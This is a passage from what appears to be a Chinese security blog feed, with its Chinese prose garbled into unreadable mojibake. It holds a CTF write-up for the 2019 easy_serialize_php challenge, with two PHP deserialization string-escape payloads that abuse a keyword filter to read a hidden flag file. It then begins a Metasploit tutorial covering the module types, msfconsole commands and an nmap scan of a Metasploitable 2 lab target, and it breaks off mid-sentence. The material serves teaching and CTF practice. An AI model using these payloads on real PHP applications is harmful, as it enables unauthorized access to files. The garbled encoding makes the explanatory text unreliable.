2019]easy_serialize_phpï¼ˆè¿‡æ»¤åå­—ç¬¦å‡å°‘ï¼‰</h4><p><img src="/2021/03/03/wei3/10.png" alt="10"></p><p>payload1:å€¼é€ƒé€¸ï¼Œè¿™å„¿éœ€è¦ä¸¤ä¸ªè¿ç»­çš„é”®å€¼å¯¹ï¼Œç”±ç¬¬ä¸€ä¸ªçš„å€¼è¦†ç›–ç¬¬äºŒä¸ªçš„é”®ï¼Œè¿™æ ·ç¬¬äºŒä¸ªå€¼å°±é€ƒé€¸å‡ºå»ï¼Œå•ç‹¬ä½œä¸ºä¸€ä¸ªé”®å€¼å¯¹:</p><p>å…ˆæ„é€ ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$_SESSION[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;&#123;1&#125;&#x27;</span>;$_SESSION[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;&#123;2&#125;&#x27;</span>;$_SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<span class="hljs-keyword">echo</span> serialize($_SESSION);</code></pre><p>æ­£å¸¸åºåˆ—åŒ–çš„ç»“æœï¼š</p><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;&#123;2&#125;&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</code></pre><p>{1}å’Œ{2}æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ç‚¹</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªè¿™æ ·çš„$_SESSION[function]</p><pre><code class="hljs routeros"><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-attribute">ZDBnM19mMWFnLnBocA</span>==&quot;;&#125;</code></pre><p>è€Œä¹‹å‰çš„filterå‡½æ•°å°†php flagéƒ½æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿$_SESSION[user]=&quot;â€œä¸­å­—ç¬¦ä¸²çš„é•¿åº¦ç­‰äºâ€;s:8:â€œfunctionâ€;s:41:&quot;ä¸€å…±23ä½<br>æ•…</p><pre><code class="hljs autoit">$_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-string">&quot;flagflagflagflagphpflag&quot;</span></code></pre><p>ç»¼åˆ</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]=<span class="hljs-string">&quot;flagflagflagphpflagflag&quot;</span>;$_SESSION[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;$_SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<span class="hljs-keyword">echo</span> serialize($_SESSION);</code></pre><p>åºåˆ—åŒ–ç»“æœä¸º</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;flagflagflagphpflagflag&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">41</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>Z<span class="hljs-number">3</span>Vlc<span class="hljs-number">3</span>RfaW<span class="hljs-number">1</span>nLnBuZw==<span class="hljs-string">&quot;;&#125;</span></code></pre><p>ç”±äºç»è¿‡filterå‡½æ•°çš„å¤„ç†ï¼Œå˜ä¸º</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;s:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">41</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>Z<span class="hljs-number">3</span>Vlc<span class="hljs-number">3</span>RfaW<span class="hljs-number">1</span>nLnBuZw==<span class="hljs-string">&quot;;&#125;</span></code></pre><p>ååºåˆ—åŒ–ç»“æœä¸ºï¼š</p><pre><code class="hljs ocaml"><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;       [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<span class="hljs-built_in">string</span>(<span class="hljs-number">23</span>)<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;function&quot;</span>;s:<span class="hljs-number">41</span>:<span class="hljs-string">&quot;&quot;</span>     [<span class="hljs-string">&quot;img&quot;</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">20</span>) <span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span> &#125;</code></pre><p>ä½†æ˜¯ç»è¿‡ååºåˆ—åŒ–ä¹‹åï¼ŒåŸæ¥æ˜¯ä¸‰ä¸ªé”®å€¼ï¼Œä½†è¿™é‡Œåªæœ‰ä¸¤ä¸ªé”®å€¼ï¼Œæ— æ³•ååºåˆ—åŒ–æˆåŠŸï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±å†åŠ ä¸Šä¸€ä¸ªé”®å€¼<br>æ•…æœ€ç»ˆ</p><pre><code class="hljs smalltalk"><span class="hljs-string">$_</span>SESSION[<span class="hljs-string">&#x27;function&#x27;</span>]=<span class="hljs-comment">&quot;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-comment">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-comment">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-comment">&quot;a&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-comment">&quot;a&quot;</span>&#125;<span class="hljs-comment">&quot;</span><span class="hljs-comment">1</span></code></pre><p>æ•…ä¼ å…¥å‚æ•°</p><pre><code class="hljs monkey">_SESSION[user]=flagflagflagphpflagflag&amp;_SESSION[<span class="hljs-function"><span class="hljs-keyword">function</span>] =</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:1:&quot;</span>a<span class="hljs-string">&quot;;&#125;</span></code></pre><p>payload2:é”®é€ƒé€¸</p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[flagphp]=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</code></pre><pre><code class="hljs smalltalk"><span class="hljs-string">$_</span>SESSION[<span class="hljs-string">&#x27;phpflag&#x27;</span>]=<span class="hljs-comment">&quot;;s:1:\&quot;</span><span class="hljs-number">1</span>\<span class="hljs-comment">&quot;;s:3:\&quot;</span>img\<span class="hljs-comment">&quot;;s:20:\&quot;</span><span class="hljs-type">ZDBnM19mMWFnLnBocA</span>==\<span class="hljs-comment">&quot;;&#125;&quot;</span>;<span class="hljs-string">$_</span>SESSION[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);var_dump( serialize(<span class="hljs-string">$_</span>SESSION) );#<span class="hljs-comment">&quot;a:2:&#123;s:7:&quot;</span>phpflag<span class="hljs-comment">&quot;;s:48:&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-comment">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-comment">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-comment">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="hljs-comment">&quot;</span><span class="hljs-comment">;s:3:&quot;</span>img<span class="hljs-comment">&quot;;s:20:&quot;</span><span class="hljs-type">Z3Vlc3RfaW1nLnBuZw</span>==<span class="hljs-comment">&quot;;&#125;&quot;</span></code></pre><p>ç»è¿‡filterè¿‡æ»¤åphpflagå°±ä¼šè¢«æ›¿æ¢æˆç©ºï¼Œ<code>s:7:&quot;phpflag&quot;;s:48:&quot; </code>å°±å˜æˆäº†<code> s:7:&quot;&quot;;s:48:&quot;;</code>å³å®Œæˆäº†é€ƒé€¸ã€‚ä¸¤ä¸ªé”®å€¼åˆ†åˆ«è¢«åºåˆ—åŒ–æˆäº†<code>s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;</code>å³é”®åå«<code>&quot;;s:48: </code>å¯¹åº”çš„å€¼ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²1ã€‚<br><code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>é”®åimgå¯¹åº”çš„å­—ç¬¦ä¸²æ˜¯<code>d0g3_f1ag.php</code>çš„base64ç¼–ç ã€‚<br>å³èŠ±æ‹¬å·åé¢çš„<code>;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code>å…¨è¢«é—å¼ƒäº†ã€‚</p><p>å°†<code>payload</code>POSTä¼ å…¥åå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶</p><p><img src="/2021/03/03/wei3/11.jpg" alt="11"></p><p>å°†æ–‡ä»¶åç¼–ç å†æ¬¡ä¼ å…¥å³å¯å¾—åˆ°flag</p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2><p>å­—ç¬¦ä¸²é€ƒé€¸é—®é¢˜ç»å¸¸æ˜¯å…ˆåºåˆ—åŒ–æŸä¸ªå˜é‡ï¼Œç„¶åå†ç»è¿‡ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œç„¶åå†ååºåˆ—åŒ–ï¼Œè¿™æ ·å­è¿‡æ»¤å‡½æ•°ä¼šæ›¿æ¢æ‰ä¸€äº›å…³é”®è¯ï¼Œå°±ä¼šé€ æˆååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸é—®é¢˜ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_43431158/article/details/108210822?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">æµ…æphpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</a></p><p><a href="http://www.bubuko.com/infodetail-3388907.html">[0CTF 2016]piapiapiaè§£é¢˜è¯¦ç»†æ€è·¯åŠå¤ç°</a></p><p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">[å®‰æ´µæ¯ 2019]easy_serialize_php</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit(ä¸€)â€”â€”å…¥é—¨æµ‹è¯•</title>
    <link href="/2021/02/27/wei1/"/>
    <url>/2021/02/27/wei1/</url>
    
    <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a class="header-anchor" href="#ç®€ä»‹">ğŸ­</a>ç®€ä»‹</h2><p>Metasploitæ¡†æ¶(Metasploit Frameworkï¼ŒMSF)æ˜¯ä¸€ä¸ªå¼€æºå·¥å…·ï¼Œç”±Rubyç¨‹åºè¯­è¨€ç¼–å†™çš„æ¨¡æ¿åŒ–æ¡†æ¶ï¼Œå…·æœ‰å¾ˆå¥½çš„æ‰©å±•æ€§ï¼Œä¾¿äºæ¸—é€æµ‹è¯•äººå‘˜å¼€å‘ã€ä½¿ç”¨å®šåˆ¶çš„å·¥å…·æ¨¡æ¿ã€‚</p><p>Metasploitå¯å‘åç«¯æ¨¡å—æä¾›å¤šç§ç”¨æ¥æ§åˆ¶æµ‹è¯•çš„æ¥å£ï¼ˆå¦‚æ§åˆ¶å°ã€Webã€CLI)æ¨èä½¿ç”¨æ§åˆ¶å°æ¥å£ï¼Œé€šè¿‡æ§åˆ¶å°æ¥å£ï¼Œä½ å¯ä»¥è®¿é—®å’Œä½¿ç”¨æ‰€æœ‰Metasploitçš„æ’ä»¶ï¼Œä¾‹å¦‚Payloadã€åˆ©ç”¨æ¨¡å—ã€Postæ¨¡å—ç­‰ã€‚Metasploitè¿˜æœ‰ç¬¬ä¸‰æ–¹ç¨‹åºçš„æ¥å£ï¼Œä¾‹å¦‚Nmap,SQLMapâ€¦â€¦</p><p>MSFæ¡†æ¶ç”±å¤šä¸ªæ¨¡å—æ„æˆï¼š</p><table><thead><tr><th>æ¨¡å—</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>Auxiliaries(è¾…åŠ©æ¨¡å—)</td><td>è¯¥æ¨¡å—ä¸ä¼šç›´æ¥åœ¨æµ‹è¯•è€…å’Œç›®æ ‡ä¸»æœºä¹‹é—´å»ºç«‹è®¿é—®ï¼Œåªè´Ÿè´£æ‰§è¡Œæ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ç­‰ç›¸å…³åŠŸèƒ½ä»¥è¾…åŠ©æ¸—é€æµ‹è¯•ã€‚</td></tr><tr><td>Exploit(æ¼æ´åˆ©ç”¨æ¨¡å—)</td><td>æ¼æ´åˆ©ç”¨æ˜¯æŒ‡ç”±æ¸—é€æµ‹è¯•è€…åˆ©ç”¨ä¸€ä¸ªç³»ç»Ÿã€åº”ç”¨æˆ–è€…æœåŠ¡ä¸­çš„å®‰å…¨æ¼æ´è¿›è¡Œçš„æ”»å‡»è¡Œä¸ºã€‚æµè¡Œçš„æ¸—é€æ”»å‡»æŠ€æœ¯åŒ…æ‹¬ç¼“å†²åŒºæº¢å‡ºã€Webåº”ç”¨ç¨‹åºæ”»å‡»ï¼Œä»¥åŠåˆ©ç”¨é…ç½®é”™è¯¯ç­‰ï¼Œå…¶ä¸­åŒ…å«æ”»å‡»è€…æˆ–æµ‹è¯•äººå‘˜é’ˆå¯¹ç³»ç»Ÿä¸­çš„æ¼æ´è€Œè®¾è®¡çš„å„ç§POCéªŒè¯ç¨‹åºï¼Œç”¨äºç ´åç³»ç»Ÿå®‰å…¨æ€§çš„æ”»å‡»ä»£ç ï¼Œæ¯ä¸ªæ¼æ´éƒ½æœ‰ç›¸åº”çš„æ”»å‡»ä»£ç ã€‚</td></tr><tr><td>Payload(æ”»å‡»è½½è·æ¨¡å—)</td><td>æ”»å‡»è½½è·æ˜¯æˆ‘ä»¬æœŸæœ›ç›®æ ‡ç³»ç»Ÿåœ¨è¢«æ¸—é€æ”»å‡»ä¹‹åå®Œæˆå®é™…æ”»å‡»åŠŸèƒ½çš„ä»£ç ï¼ŒæˆåŠŸæ¸—é€ç›®æ ‡åï¼Œç”¨äºåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œä»»æ„å‘½ä»¤æˆ–è€…æ‰§è¡Œç‰¹å®šä»£ç ï¼Œåœ¨Metasploitæ¡†æ¶ä¸­å¯ä»¥è‡ªç”±åœ°é€‰æ‹©ã€ä¼ é€å’Œæ¤å…¥ã€‚æ”»å‡»è½½è·ä¹Ÿå¯èƒ½æ˜¯ç®€å•åœ°åœ¨ç›®æ ‡æ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œå¦‚æ·»åŠ ç”¨æˆ·è´¦å·ç­‰ã€‚</td></tr><tr><td>Post(åæœŸæ¸—é€æ¨¡å—)</td><td>æ¨¡å—ä¸»è¦ç”¨äºåœ¨å–å¾—ç›®æ ‡ç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒåï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œå¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€å®æ–½è·³æ¿æ”»å‡»ç­‰ã€‚</td></tr><tr><td>Encoders(ç¼–ç å·¥å…·æ¨¡å—)</td><td>è¯¥æ¨¡å—åœ¨æ¸—é€æµ‹è¯•ä¸­è´Ÿè´£å…æ€ï¼Œä»¥é˜²æ­¢è¢«æ€æ¯’è½¯ä»¶ã€é˜²ç«å¢™ã€IDSåŠç±»ä¼¼çš„å®‰å…¨è½¯ä»¶æ£€æµ‹å‡ºæ¥</td></tr></tbody></table><h3 id="å¸¸ç”¨å‘½ä»¤"><a class="header-anchor" href="#å¸¸ç”¨å‘½ä»¤">ğŸ­</a>å¸¸ç”¨å‘½ä»¤</h3><p>ç›´æ¥helpå¯æŸ¥è¯¢</p><p><img src="/2021/02/27/wei1/2.jpg" alt="2"></p><p>å¥½å¥½å­¦è‹±è¯­ğŸ˜”ğŸ˜”ğŸ˜”</p><h4 id="msfconsole"><a class="header-anchor" href="#msfconsole">ğŸ­</a>msfconsole</h4><pre><code class="hljs properties"><span class="hljs-meta">?</span>             <span class="hljs-string">æ˜¾ç¤ºå¸®åŠ©èœå•</span><span class="hljs-attr">back</span>          <span class="hljs-string">ä»å½“å‰ç¯å¢ƒè¿”å›åˆ°ä¸»è·¯å¾„</span><span class="hljs-attr">banner</span>        <span class="hljs-string">æ˜¾ç¤ºè½¯ä»¶æ——æ ‡ä¿¡æ¯</span><span class="hljs-attr">cd</span>            <span class="hljs-string">æ”¹å˜å½“å‰å·¥ä½œè·¯å¾„</span><span class="hljs-attr">color</span>         <span class="hljs-string">åˆ‡æ¢é¢œè‰²</span><span class="hljs-attr">connect</span>       <span class="hljs-string">è¿æ¥ä¸»æœºï¼Œç±»ä¼¼äºtelnetå’Œnc</span><span class="hljs-attr">exit</span>          <span class="hljs-string">é€€å‡º</span><span class="hljs-attr">help</span>          <span class="hljs-string">æ˜¾ç¤ºå¸®åŠ©èœå•ï¼Œå³è¯¥é¡µé¢</span><span class="hljs-attr">info</span>          <span class="hljs-string">æ˜¾ç¤ºæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯</span><span class="hljs-attr">irb</span>           <span class="hljs-string">è¿›å…¥irbè„šæœ¬æ¨¡å¼</span><span class="hljs-attr">jobs</span>          <span class="hljs-string">æ˜¾ç¤ºå’Œç®¡ç†ä½œä¸š</span><span class="hljs-attr">kill</span>          <span class="hljs-string">ç»“æŸä¸€ä¸ªä½œä¸š</span><span class="hljs-attr">load</span>          <span class="hljs-string">åŠ è½½frameworkæ’ä»¶</span><span class="hljs-attr">loadpath</span>      <span class="hljs-string">ä»æŒ‡å®šè·¯å¾„åŠ è½½æ¨¡å—</span><span class="hljs-attr">quit</span>          <span class="hljs-string">é€€å‡º</span><span class="hljs-attr">resource</span>      <span class="hljs-string">è¿è¡Œæ–‡ä»¶ä¸­çš„å‘½ä»¤</span><span class="hljs-attr">route</span>         <span class="hljs-string">Route traffic through a session</span><span class="hljs-attr">save</span>          <span class="hljs-string">ä¿æŒæ•°æ®</span><span class="hljs-attr">search</span>        <span class="hljs-string">æœç´¢æ¨¡å—åŠåç§°</span><span class="hljs-attr">sessions</span>      <span class="hljs-string">æ˜¾ç¤ºåŠè½¬å­˜ä¼šè¯åˆ—è¡¨</span><span class="hljs-attr">set</span>           <span class="hljs-string">è®¾ç½®å˜é‡å€¼</span><span class="hljs-attr">setg</span>          <span class="hljs-string">è®¾ç½®å…¨å±€å˜é‡å€¼</span><span class="hljs-attr">show</span>          <span class="hljs-string">æ˜¾ç¤ºç»™å®šç±»å‹çš„æ¨¡å—æˆ–å…¨éƒ¨æ¨¡å—</span><span class="hljs-attr">sleep</span>         <span class="hljs-string">ä¼‘çœ </span><span class="hljs-attr">unload</span>        <span class="hljs-string">å¸è½½ framework æ’ä»¶</span><span class="hljs-attr">unset</span>         <span class="hljs-string">å–æ¶ˆå˜é‡è®¾ç½®</span><span class="hljs-attr">unsetg</span>        <span class="hljs-string">å–æ¶ˆå…¨å±€å˜é‡è®¾ç½®</span><span class="hljs-attr">use</span>           <span class="hljs-string">æ ¹æ®åå­—é€‰æ‹©ä¸€ä¸ªæ¨¡å—</span><span class="hljs-attr">version</span>       <span class="hljs-string">æ˜¾ç¤ºç‰ˆæœ¬</span><span class="hljs-attr">advanced</span>      <span class="hljs-string">æ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—çš„é«˜çº§é€‰é¡¹</span><span class="hljs-attr">clearm</span>        <span class="hljs-string">æ¸…é™¤æ¨¡å—æ ˆ</span><span class="hljs-attr">listm</span>         <span class="hljs-string">åˆ—å‡ºæ¨¡å—å †æ ˆ</span><span class="hljs-attr">options</span>       <span class="hljs-string">æ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—çš„å…¨å±€é€‰é¡¹</span><span class="hljs-attr">popm</span>          <span class="hljs-string">ä»å †æ ˆä¸­å¼¹å‡ºæœ€æ–°çš„æ¨¡å—å¹¶ä½¿å…¶å¤„äºæ´»åŠ¨çŠ¶æ€</span><span class="hljs-attr">previous</span>      <span class="hljs-string">å°†å…ˆå‰åŠ è½½çš„æ¨¡å—è®¾ç½®ä¸ºå½“å‰æ¨¡å—</span><span class="hljs-attr">pushm</span>         <span class="hljs-string">å°†æ´»åŠ¨æ¨¡å—æˆ–æ¨¡å—åˆ—è¡¨æ¨å…¥æ¨¡å—å †æ ˆ</span><span class="hljs-attr">reload_all</span>    <span class="hljs-string">ä»æ‰€æœ‰å®šä¹‰çš„æ¨¡å—è·¯å¾„ä¸­é‡æ–°åŠ è½½æ‰€æœ‰çš„æ¨¡å—</span><span class="hljs-attr">search</span>        <span class="hljs-string">æœç´¢æ¨¡å—åç§°å’Œæè¿°</span><span class="hljs-attr">show</span>          <span class="hljs-string">æ˜¾ç¤ºç»™å®šç±»å‹çš„æ¨¡å—æˆ–æ‰€æœ‰æ¨¡å—</span><span class="hljs-attr">log</span>           <span class="hljs-string">å¦‚æœå¯èƒ½çš„è¯ï¼Œå°†æ˜¾ç¤ºæ¡†æ¶.logé¡µé¢æ˜¾ç¤ºåˆ°æœ«å°¾</span><span class="hljs-attr">pry</span>           <span class="hljs-string">æ‰“å¼€å½“å‰æ¨¡å—æˆ–æ¡†æ¶ä¸Šçš„æ’¬è°ƒè¯•å™¨</span><span class="hljs-attr">reload_lib</span>    <span class="hljs-string">ä»æŒ‡å®šçš„è·¯å¾„é‡æ–°åŠ è½½Rubyåº“æ–‡ä»¶</span><span class="hljs-attr">db_add_host</span>   <span class="hljs-string">æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªä¸»æœºåˆ°æ•°æ®åº“</span><span class="hljs-attr">db_add_note</span>   <span class="hljs-string">æ·»åŠ ä¸€ä¸ªæ³¨é‡Šåˆ°ä¸»æœº</span><span class="hljs-attr">db_add_port</span>   <span class="hljs-string">æ·»åŠ ä¸€ä¸ªç«¯å£åˆ°ä¸»æœº</span><span class="hljs-attr">db_connect</span>    <span class="hljs-string">è¿æ¥ä¸€ä¸ªå­˜åœ¨çš„æ•°æ®åº“</span><span class="hljs-attr">db_create</span>     <span class="hljs-string">åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“å®ä¾‹</span><span class="hljs-attr">db_del_host</span>   <span class="hljs-string">ä»æ•°æ®åº“åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªä¸»æœº</span><span class="hljs-attr">db_del_port</span>   <span class="hljs-string">ä»æ•°æ®åº“åˆ é™¤ä¸€ä¸ªç«¯å£</span><span class="hljs-attr">db_destroy</span>    <span class="hljs-string">åˆ é™¤ä¸€ä¸ªå­˜åœ¨çš„æ•°æ®åº“</span><span class="hljs-attr">db_disconnect</span> <span class="hljs-string">æ–­å¼€ä¸å½“å‰æ•°æ®åº“å®ä¾‹çš„è¿æ¥</span><span class="hljs-attr">db_driver</span>     <span class="hljs-string">æŒ‡å®šä¸€ä¸ªæ•°æ®åº“é©±åŠ¨</span><span class="hljs-attr">db_hosts</span>      <span class="hljs-string">åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰ä¸»æœº</span><span class="hljs-attr">db_nmap</span>       <span class="hljs-string">æ‰§è¡ŒNmapå¹¶è®°å½•è¾“å‡º</span><span class="hljs-attr">db_notes</span>      <span class="hljs-string">åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ³¨é‡Š</span><span class="hljs-attr">db_services</span>   <span class="hljs-string">åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æœåŠ¡</span><span class="hljs-attr">db_vulns</span>      <span class="hljs-string">åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ‰€æœ‰æ¼æ´</span><span class="hljs-attr">db_workspace</span>  <span class="hljs-string">è½¬æ¢æ•°æ®åº“å·¥ä½œåŒº</span><span class="hljs-attr">db_import_ip_list</span>     <span class="hljs-string">å¼•å…¥ä¸€ä¸ªIPåˆ—è¡¨æ–‡ä»¶</span><span class="hljs-attr">db_import_amap_mlog</span>   <span class="hljs-string">å¼•å…¥ä¸€ä¸ªTHC-Amapæ‰«æç»“æœæ–‡ä»¶(-o -m)</span><span class="hljs-attr">db_import_nessus_nbe</span>  <span class="hljs-string">å¼•å…¥ä¸€ä¸ªNessusæ‰«æç»“æœæ–‡ä»¶(NBE)</span><span class="hljs-attr">db_import_nessus_xml</span>  <span class="hljs-string">å¼•å…¥ä¸€ä¸ªNessusæ‰«æç»“æœæ–‡ä»¶</span><span class="hljs-attr">db_import_nmap_xml</span>    <span class="hljs-string">å¼•å…¥ä¸€ä¸ªNmapæ‰«æç»“æœæ–‡ä»¶(-oX)</span><span class="hljs-attr">db_autopwn</span>            <span class="hljs-string">è‡ªåŠ¨åˆ©ç”¨</span></code></pre><h3 id="åˆçº§æµ‹è¯•"><a class="header-anchor" href="#åˆçº§æµ‹è¯•">ğŸ­</a>åˆçº§æµ‹è¯•</h3><p>æ¥ä¸‹æ¥ç”¨Metasploitable 2é¶æœºè¿›è¡Œæµ‹è¯•</p><h4 id="å…ˆç”¨nmapæŸ¥çœ‹ç³»ç»Ÿå¼€æ”¾ç«¯å£å’Œç›¸å…³åº”ç”¨ç¨‹åº"><a class="header-anchor" href="#å…ˆç”¨nmapæŸ¥çœ‹ç³»ç»Ÿå¼€æ”¾ç«¯å£å’Œç›¸å…³åº”ç”¨ç¨‹åº">ğŸ­</a>å…ˆç”¨nmapæŸ¥çœ‹ç³»ç»Ÿå¼€æ”¾ç«¯å£å’Œç›¸å…³åº”ç”¨ç¨‹åº</h4><p>é€šå¸¸ä½¿ç”¨<code>nmap â€“sV IP(æˆ–è€…åŸŸå)</code>ï¼Œå¦‚æœæœºå™¨è®¾ç½®æœ‰é˜²ç«å¢™ç¦pingï¼Œå¯ä»¥ä½¿ç”¨nmap -P0(æˆ–è€…-Pn) â€“sV IP(æˆ–è€…åŸŸå)æ¥æŸ¥çœ‹ä¸»æœºçš„å¼€æ”¾æƒ…å†µ</p><p><img src="/2021/02/27/wei1/3.jpg" alt="3"></p><p>å¯ä»¥çœ‹åˆ°é¶æœºå¼€æ”¾çš„ç«¯å£ï¼Œå¼€æ”¾çŠ¶æ€ï¼ŒæœåŠ¡ç±»å‹ï¼Œå’Œç‰ˆæœ¬å·ï¼Œå…¶ä¸­æ¸—é€æœ€é‡è¦çš„ä¸¤ä¸ªå‚æ•°æ˜¯å¼€æ”¾çŠ¶æ€å’Œç‰ˆæœ¬å·ã€‚ç‰ˆæœ¬å·ä¹Ÿå°±æ˜¯ç³»ç»Ÿæ‰«æä¸­ï¼Œåœ¨å¼€å‘å®‰å…¨æ‰«æä»¶é‡Œç»å¸¸æåŠçš„æ¼æ´æŒ‡çº¹ï¼Œå› 